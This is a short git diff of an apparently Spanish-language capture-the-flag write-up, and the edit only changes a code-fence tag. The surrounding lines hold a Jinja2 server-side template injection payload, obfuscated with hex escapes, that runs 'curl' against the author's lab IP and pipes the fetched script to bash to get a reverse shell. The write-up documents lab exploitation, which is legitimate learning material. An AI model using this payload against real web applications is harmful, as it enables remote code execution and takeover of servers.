@@ -161,7 +161,7 @@ buscando payloads encontre en [PayloadAllTheThings](https://github.com/swisskyre
 ![SSTI](../assets/images-Iclean/Iclean14.png)
 
 Por lo tanto procedo a enviarme una reverse shell, lo consigo realizando varias pruebas, hasta vi que con curl funcionaba por lo cual creo un archivo llamado shell, con el cual me envia un reverse shell por el puerto 443, y haciendo una peticion a mi servidor obtengo una revershell
-```javascript
+```js
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl+10.10.16.51/shell|+bash')|attr('read')()}}
 ```
 Contenido del archivo
